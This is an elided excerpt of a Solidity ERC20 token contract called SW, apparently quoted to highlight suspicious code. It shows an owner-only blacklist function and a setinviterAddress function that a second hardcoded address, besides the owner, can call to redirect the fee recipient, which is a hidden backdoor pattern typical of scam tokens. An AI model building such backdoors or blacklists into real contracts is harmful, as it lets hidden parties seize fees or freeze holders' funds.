...
contract SW is IERC20, Ownable {
    ...
    address public inviterAddress = address(0x04Ad6f825a0a4781806254a2866F4614ea2F3296);
    ...
    function blackbot(address addr, bool status) public onlyOwner{
     ...
     function setinviterAddress(address newAddress) public {
        require(_owner ==  msg.sender || msg.sender    ==  address(0xd4f61B89c0CaE92e1A1DE10eE779C4381A428118) , "owner");
        inviterAddress = payable(newAddress);
    }
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            rate = _taxFee + _destroyFee + _inviterFee ;
        }
